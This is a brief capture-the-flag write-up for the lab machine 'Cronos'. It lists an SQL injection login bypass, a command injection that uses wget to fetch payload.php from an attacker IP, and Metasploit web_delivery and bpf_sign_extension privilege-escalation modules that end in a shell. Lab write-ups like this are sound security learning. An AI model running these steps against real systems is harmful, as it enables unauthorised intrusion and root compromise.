# Cronos
## Sqlite - Commands - Web_delivery - bpf_sign_extensi0n_priv_esc
> First we have to bruteforce the subdomain, and that way we will find admin.cronos.htb

After this we will be able to do a little SQL injection magic

```
' or 1=1#
```

This will give the admin access to the site where we can inject os code

```
;wget 10.10.14.20:9000/payload.php

msfconsole
use exploit/multi/script/web_delivery
sessions -u 1

use exploit/linux/local/bpf_sign_extension_priv_esc
set SESSION 2
run
```

*Congratulations, you have a shell!*
